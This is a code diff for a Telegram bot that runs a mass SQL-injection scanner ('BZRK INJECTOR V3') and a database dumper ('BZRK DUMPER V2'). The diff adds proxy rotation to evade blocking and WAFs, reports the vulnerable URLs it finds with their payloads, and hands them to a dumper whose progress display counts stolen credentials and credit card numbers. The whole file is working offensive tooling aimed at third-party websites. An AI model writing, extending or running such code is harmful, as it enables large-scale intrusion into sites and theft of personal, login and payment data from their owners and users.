+def turbo_inject(cid, uid, mid, jid, urls, mode, threads=15):
     try:
-        jp_reg(jid,"inject",uid,cid,{"threads":threads})
-        try: save_json(os.path.join(JOBS_DATA,jid+".urls"),urls)
-        except: pass
-        vuln=[]; nonev=[]; done=[0]; last=[0.0]; details=[]; reqs=[0]; wafed=[0]; dbst={}; t0=time.time(); since_save=[0]
-        LIVE[jid]={"kind":"inject","vuln":vuln,"nonev":nonev}
-        bump("inject"); bumpU(uid,"inject")
-        vc=load_json(VULN_CACHE,{}); now=time.time(); to_test=[]
-        to=min(max(mode["timeout"],6),10)
-        tb=mode.get("timeout",0)>=12
+        jp_reg(jid, "inject", uid, cid, {"threads": threads})
+        try:
+            save_json(os.path.join(JOBS_DATA, jid + ".urls"), urls)
+        except:
+            pass
+
+        vuln = []
+        nonev = []
+        done = [0]
+        last = [0.0]
+        details = []
+        reqs = [0]
+        wafed = [0]
+        dbst = {}
+        t0 = time.time()
+        since_save = [0]
+        LIVE[jid] = {"kind": "inject", "vuln": vuln, "nonev": nonev}
+
+        # 🔥 SMART PROXY ROTATION
+        proxy_pool = hprox(uid)
+        proxy_idx = [0]
+
+        def next_proxy():
+            if not proxy_pool:
+                return None
+            px = proxy_pool[proxy_idx[0] % len(proxy_pool)]
+            proxy_idx[0] += 1
+            return px
+
+        bump("inject")
+        bumpU(uid, "inject")
+        vc = load_json(VULN_CACHE, {})
+        now = time.time()
+        to_test = []
+        to = min(max(mode["timeout"], 6), 10)
+        tb = mode.get("timeout", 0) >= 12
+
         for u in urls:
-            e=vc.get(u)
-            if e and e.get("sv")==SCAN_V and now-e.get("t",0)<7*86400:
-                if e.get("v"): vuln.append({"url":u})
-                else: nonev.append(u)
-                done[0]+=1
-            else: to_test.append(u)
-            
+            e = vc.get(u)
+            if e and e.get("sv") == SCAN_V and now - e.get("t", 0) < 7 * 86400:
+                if e.get("v"):
+                    vuln.append({"url": u})
+                else:
+                    nonev.append(u)
+                done[0] += 1
+            else:
+                to_test.append(u)
+
         tb_txt = " | ⏰ TIME-BLIND" if tb else ""
-        try: bot.edit_message_text(f"<blockquote><b>{E['syringe']} BZRK INJECTOR V3\n{LINE}\n{E['zap']} FRESH: {len(to_test)} | {E['gear']} THREADS: {threads} | {E['zap']} {to}S{tb_txt}\n🗄️ MYSQL•MARIADB•PG•MSSQL•ORACLE•SQLITE</b></blockquote>", chat_id=cid, message_id=mid, reply_markup=stop_markup(jid), parse_mode="HTML")
-        except: pass
-        
-        HSEM={}
+        try:
+            bot.edit_message_text(
+                f"<blockquote><b>{E['syringe']} BZRK INJECTOR V3\n{LINE}\n🩸 TOTAL URLS: {len(urls)} | ⚡ FRESH: {len(to_test)} | 📦 CACHED: {len(urls)-len(to_test)}\n🛡️ PROXIES: {len(proxy_pool)} | {E['gear']} THREADS: {threads} | ⏱ {to}S{tb_txt}\n🗄️ MYSQL•MARIADB•PG•MSSQL•ORACLE•SQLITE</b></blockquote>",
+                chat_id=cid, message_id=mid, reply_markup=stop_markup(jid), parse_mode="HTML"
+            )
+        except:
+            pass
+
+        HSEM = {}
+
         async def run():
-            conn=aiohttp.TCPConnector(limit=threads+10,limit_per_host=20,ssl=False,ttl_dns_cache=300,enable_cleanup_closed=True)
-            async with aiohttp.ClientSession(connector=conn,headers=HDR,timeout=aiohttp.ClientTimeout(total=to)) as s:
-                sem=asyncio.Semaphore(threads)
+            conn = aiohttp.TCPConnector(limit=threads + 10, limit_per_host=20, ssl=False, ttl_dns_cache=300, enable_cleanup_closed=True)
+            async with aiohttp.ClientSession(connector=conn, headers=HDR, timeout=aiohttp.ClientTimeout(total=to)) as s:
+                sem = asyncio.Semaphore(threads)
+
                 def hsem(h):
-                    if h not in HSEM: HSEM[h]=asyncio.Semaphore(2)
+                    if h not in HSEM:
+                        HSEM[h] = asyncio.Semaphore(2)
                     return HSEM[h]
+
                 async def task(u):
                     async with sem:
-                        reqs[0]+=1
+                        reqs[0] += 1
+                        px = next_proxy()
                         async with hsem(urlparse(u).netloc):
-                            return await a_scan(s,u,to,tb)
-                for i in range(0,len(to_test),INJ_BATCH):
-                    if stopped(jid): break
-                    batch=to_test[i:i+INJ_BATCH]
-                    res=await asyncio.gather(*[task(u) for u in batch],return_exceptions=True)
-                    for u,r in zip(batch,res):
-                        if isinstance(r,dict) and r.get("waf"):
-                            wafed[0]+=1; nonev.append(u); vc[u]={"v":0,"t":now,"sv":SCAN_V}
-                        elif isinstance(r,dict) and r:
-                            vuln.append(r); details.append(r); vc[u]={"v":1,"t":now,"sv":SCAN_V}
-                            dbst[r.get("db","?")]=dbst.get(r.get("db","?"),0)+1
-                        else: nonev.append(u); vc[u]={"v":0,"t":now,"sv":SCAN_V}
-                    done[0]+=len(batch); since_save[0]+=len(batch)
-                    if since_save[0]>=2000: save_json(VULN_CACHE,vc); since_save[0]=0
-                    now2=time.time()
-                    if now2-last[0]>2:
-                        last[0]=now2
-                        rps=round(reqs[0]/max(1,now2-t0),1)
-                        dbs=" ".join(f"{k}:{v}" for k,v in sorted(dbst.items(),key=lambda x:-x[1]))
-                        try: bot.edit_message_text(f"<blockquote><b>{E['syringe']} BZRK INJECTOR V3\n{LINE}\n{bar(done[0],len(urls))} {pct(done[0],len(urls))}%\n{E['blood']} VULN: {len(vuln)} | {E['shield']} SAFE: {len(nonev)} | 🧱 WAF: {wafed[0]}\n🗄️ {dbs or '—'}\n{E['zap']} {rps} R/S | {E['gear']} {threads} THREADS | BATCH {i//INJ_BATCH+1}</b></blockquote>", chat_id=cid, message_id=mid, reply_markup=stop_markup(jid), parse_mode="HTML")
-                        except: pass
+                            return await a_scan(s, u, to, tb, proxy=px)
+
+                for i in range(0, len(to_test), INJ_BATCH):
+                    if stopped(jid):
+                        break
+                    batch = to_test[i:i + INJ_BATCH]
+                    res = await asyncio.gather(*[task(u) for u in batch], return_exceptions=True)
+                    for u, r in zip(batch, res):
+                        if isinstance(r, dict) and r.get("waf"):
+                            wafed[0] += 1
+                            nonev.append(u)
+                            vc[u] = {"v": 0, "t": now, "sv": SCAN_V}
+                        elif isinstance(r, dict) and r:
+                            vuln.append(r)
+                            details.append(r)
+                            vc[u] = {"v": 1, "t": now, "sv": SCAN_V}
+                            dbst[r.get("db", "?")] = dbst.get(r.get("db", "?"), 0) + 1
+                        else:
+                            nonev.append(u)
+                            vc[u] = {"v": 0, "t": now, "sv": SCAN_V}
+                    done[0] += len(batch)
+                    since_save[0] += len(batch)
+                    if since_save[0] >= 2000:
+                        save_json(VULN_CACHE, vc)
+                        since_save[0] = 0
+                    now2 = time.time()
+                    if now2 - last[0] > 2:
+                        last[0] = now2
+                        rps = round(reqs[0] / max(1, now2 - t0), 1)
+                        dbs = " ".join(f"{k}:{v}" for k, v in sorted(dbst.items(), key=lambda x: -x[1]))
+                        try:
+                            total_batches = (len(to_test) + INJ_BATCH - 1) // INJ_BATCH
+                            current_batch = i // INJ_BATCH + 1
+                            bot.edit_message_text(
+                                f"<blockquote><b>{E['syringe']} BZRK INJECTOR V3\n{LINE}\n{bar(done[0],len(urls))} {pct(done[0],len(urls))}%\n{E['blood']} VULN: {len(vuln)} | {E['shield']} SAFE: {len(nonev)} | 🧱 WAF: {wafed[0]}\n🛡️ PROXIES: {len(proxy_pool)} | 🔄 ROTATIONS: {proxy_idx[0]}\n🗄️ {dbs or '—'}\n{E['zap']} {rps} R/S | {E['gear']} {threads} THREADS\n📊 BATCH: {current_batch}/{total_batches} | TOTAL: {done[0]}/{len(urls)} | LEFT: {len(urls)-done[0]}</b></blockquote>",
+                                chat_id=cid, message_id=mid, reply_markup=stop_markup(jid), parse_mode="HTML"
+                            )
+                        except:
+                            pass
+
         _run_on_loop(run())
-        if len(vc)>20000: vc=dict(sorted(vc.items(),key=lambda kv:-kv[1].get("t",0))[:10000])
-        save_json(VULN_CACHE,vc); clear_markup(cid,mid); jp_unreg(jid)
-        if stopped(jid): LIVE.pop(jid,None); return
-        vurls=[v["url"] for v in vuln]
-        if vurls: send_doc(cid,("\n".join(vurls)+"\n").encode(),"vulnerable_urls.txt",uid)
-        if nonev: send_doc(cid,("\n".join(nonev)+"\n").encode(),"none_vulnerable_urls.txt",uid)
-        if details:
-            det="\n".join(f"URL: {d['url']}\nPARAM: {d['param']} | DB: {d.get('db','?')}\nPAYLOAD: {d['payload']}\nSIG: {d['sig']} | CONF: {d.get('conf',2)}\n{'-'*40}" for d in details)
-            send_doc(cid,(det+"\n").encode(),"vuln_details.txt",uid)
-            send_doc(cid,html_report("Vulnerability Report",details).encode(),"report.html",uid)
+        if len(vc) > 20000:
+            vc = dict(sorted(vc.items(), key=lambda kv: -kv[1].get("t", 0))[:10000])
+        save_json(VULN_CACHE, vc)
+        clear_markup(cid, mid)
+        jp_unreg(jid)
+        if stopped(jid):
+            LIVE.pop(jid, None)
+            return
+
+        vurls = [v["url"] for v in vuln]
         if vurls:
-            LAST.setdefault(uid,{})["vuln"]=vurls
-            dbs=" | ".join(f"{k}×{v}" for k,v in sorted(dbst.items(),key=lambda x:-x[1]))
-            mk=types.InlineKeyboardMarkup(); mk.add(sbtn("SEND TO DUMPER","pipe:data","danger"))
+            send_doc(cid, ("\n".join(vurls) + "\n").encode(), "vulnerable_urls.txt", uid)
+        if nonev:
+            send_doc(cid, ("\n".join(nonev) + "\n").encode(), "none_vulnerable_urls.txt", uid)
+        if details:
+            det = "\n".join(
+                f"URL: {d['url']}\nPARAM: {d['param']} | DB: {d.get('db','?')}\nPAYLOAD: {d['payload']}\nSIG: {d['sig']} | CONF: {d.get('conf',2)}\n{'-'*40}"
+                for d in details
+            )
+            send_doc(cid, (det + "\n").encode(), "vuln_details.txt", uid)
+            send_doc(cid, html_report("Vulnerability Report", details).encode(), "report.html", uid)
+
+        if vurls:
+            LAST.setdefault(uid, {})["vuln"] = vurls
+            dbs = " | ".join(f"{k}×{v}" for k, v in sorted(dbst.items(), key=lambda x: -x[1]))
+            mk = types.InlineKeyboardMarkup()
+            mk.add(sbtn("SEND TO DUMPER", "pipe:data", "danger"))
             status_txt = "[PARTIAL]" if stopped(jid) else "COMPLETED"
-            bot.send_message(cid, f"<blockquote><b>{E['tick']} INJECTOR {status_txt}\n{LINE}\n{E['blood']} VULN: {len(vuln)} | {E['shield']} SAFE: {len(nonev)} | 🧱 WAF: {wafed[0]}\n🗄️ {dbs or '—'}</b></blockquote>", reply_markup=mk, parse_mode="HTML")
-        else: bot.send_message(cid, f"<blockquote><b>{E['cross']} INJECTOR COMPLETED\n{LINE}\n{E['blood']} VULN: 0 | {E['shield']} SAFE: {len(nonev)} | 🧱 WAF: {wafed[0]}\n{E['search']} {done[0]}/{len(urls)} TESTED</b></blockquote>", parse_mode="HTML")
+            bot.send_message(
+                cid,
+                f"<blockquote><b>{E['tick']} INJECTOR {status_txt}\n{LINE}\n{E['blood']} VULN: {len(vuln)} | {E['shield']} SAFE: {len(nonev)} | 🧱 WAF: {wafed[0]}\n🛡️ PROXIES: {len(proxy_pool)}\n🗄️ {dbs or '—'}</b></blockquote>",
+                reply_markup=mk, parse_mode="HTML"
+            )
+        else:
+            bot.send_message(
+                cid,
+                f"<blockquote><b>{E['cross']} INJECTOR COMPLETED\n{LINE}\n{E['blood']} VULN: 0 | {E['shield']} SAFE: {len(nonev)} | 🧱 WAF: {wafed[0]}\n{E['search']} {done[0]}/{len(urls)} TESTED</b></blockquote>",
+                parse_mode="HTML"
+            )
     except Exception as e:
-        try: bot.send_message(cid, f"<blockquote><b>{E['cross']} INJECT BUG:\n{type(e).__name__}: {e}</b></blockquote>", parse_mode="HTML")
-        except: pass
+        try:
+            bot.send_message(cid, f"<blockquote><b>{E['cross']} INJECT BUG:\n{type(e).__name__}: {e}</b></blockquote>", parse_mode="HTML")
+        except:
+            pass
 
 def sane_idlist(s,max_tok=400):
     toks=[t.strip() for t in s.split(",") if t.strip()]
@@ -2944,11 +2851,15 @@ def dump_one_url(url,ph,mode,juicy,jid):
     except: return None
 
 DUMP_CACHE=P("dump_cache.json")
+
 def run_datadump(cid,uid,mid,jid,urls,ph_old,mode,juicy):
     try:
         jp_reg(jid,"dump",uid,cid,{"juicy":juicy})
         try: save_json(os.path.join(JOBS_DATA,jid+".urls"),urls)
         except: pass
+        t_start = time.time()
+        proxy_pool_dump = uprox(uid)
+        proxy_rotations_dump = [0]
         ph=PH(uprox(uid)); dumps=[]; done=[0]; last=[0.0]; cur=["-"]; cached=[0]
         LIVE[jid]={"kind":"dump","dumps":dumps}
         bump("dump"); bumpU(uid,"dump")
@@ -2959,9 +2870,14 @@ def run_datadump(cid,uid,mid,jid,urls,ph_old,mode,juicy):
             
         def edit(force=False):
             now=time.time()
-            if force or now-last[0]>3:
+            if force or now-last[0]>20:
                 last[0]=now
-                try: bot.edit_message_text(f"<blockquote><b>{E['blood']} BZRK DUMPER V2\n{LINE}\n{bar(done[0],len(to_dump))} {pct(done[0],len(to_dump))}%\n{E['disk']} SAVED: {len(dumps)} | {E['lock']} CREDS: {sum(len(d.get('creds',[])) for d in dumps)} | CUR: {cur[0][:20]}</b></blockquote>", chat_id=cid, message_id=mid, reply_markup=stop_markup(jid), parse_mode="HTML")
+                t_elapsed = max(1, now - t_start)
+                speed = round(done[0] / (t_elapsed / 60), 1) if done[0] else 0
+                eta_txt = eta_line(t_start, done[0], len(to_dump))
+                creds_total = sum(len(d.get("creds",[])) for d in dumps)
+                cc_total = sum(len(d.get("cards",[])) for d in dumps)
+                try: bot.edit_message_text(f"<blockquote><b>{E['blood']} BZRK DUMPER V2\n{LINE}\n{bar(done[0],len(to_dump))} {pct(done[0],len(to_dump))}%\n📁 SITES DUMPED: {len(dumps)} | 🔐 CREDS: {creds_total} | 💳 CC: {cc_total}\n🛡️ PROXIES: {len(proxy_pool_dump)} | 🔄 ROT: {proxy_rotations_dump[0]}\n⚡ {speed} sites/min | ⚙️ {min(DUMP_WORKERS,mode['workers'])} WORKERS\n📊 TOTAL: {done[0]}/{len(to_dump)} sites | LEFT: {len(to_dump)-done[0]}\n{eta_txt}\nCUR: {cur[0][:20]}</b></blockquote>", chat_id=cid, message_id=mid, reply_markup=stop_markup(jid), parse_mode="HTML")
                 except: pass
                 
         def on_done(f,u):
@@ -2976,7 +2892,9 @@ def run_datadump(cid,uid,mid,jid,urls,ph_old,mode,juicy):
         save_json(DUMP_CACHE,dc)
         clear_markup(cid,mid); edit(True); jp_unreg(jid)
         if stopped(jid):
-            save_json(DUMP_CACHE,dc); clear_markup(cid,mid); jp_unreg(jid); LIVE.pop(jid,None); return
+            save_json(DUMP_CACHE,dc); clear_markup(cid,mid); jp_unreg(jid)
+            threading.Thread(target=_partial_sender,args=(jid,cid),daemon=True).start()
+            LIVE.pop(jid,None); return
             
         juicy_found=[]
         for dmp in dumps:
@@ -2998,6 +2916,7 @@ def run_datadump(cid,uid,mid,jid,urls,ph_old,mode,juicy):
     except Exception as e:
         try: bot.send_message(cid, f"<blockquote><b>{E['cross']} DUMPER ERROR:\n{type(e).__name__}: {e}</b></blockquote>", parse_mode="HTML")
         except: pass
+
 
 def _resume_auto():
     time.sleep(12)
